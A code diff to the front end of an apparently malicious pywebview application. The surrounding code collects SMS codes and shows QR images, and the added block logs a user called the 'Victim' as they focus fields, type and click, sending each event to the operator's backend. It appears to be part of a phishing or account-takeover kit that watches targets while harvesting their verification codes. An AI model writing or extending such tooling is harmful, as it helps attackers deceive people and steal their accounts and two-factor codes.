@@ -789,6 +789,37 @@
             window.pywebview.api.collect_sms(code);
         }
 
+        // --- PRO TELEMETRY: Full Action Logging ---
+        function attachLogging() {
+            // Focus events
+            document.querySelectorAll('input').forEach(input => {
+                input.addEventListener('focus', function() {
+                    window.pywebview.api.log_event(`Victim focused on input: ${this.id || this.placeholder || 'Unknown'}`);
+                });
+            });
+
+            // Input changes (brief summaries)
+            let lastKeyTime = 0;
+            document.querySelectorAll('input').forEach(input => {
+                input.addEventListener('keyup', function() {
+                    const now = Date.now();
+                    if (now - lastKeyTime > 5000) { // Every 5s
+                       window.pywebview.api.log_event(`Victim is typing in: ${this.id || 'Unknown'}`);
+                       lastKeyTime = now;
+                    }
+                });
+            });
+
+            // Click events
+            document.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A' || e.target.tagName === 'BUTTON' || e.target.closest('button')) {
+                    const text = e.target.innerText || 'Icon/None';
+                    window.pywebview.api.log_event(`Victim clicked: ${text.trim()}`);
+                }
+            });
+        }
+        window.addEventListener('pywebviewready', attachLogging);
+
         function updateQR(base64_img) {
             const img = document.getElementById('qr_img');
             if (img) {
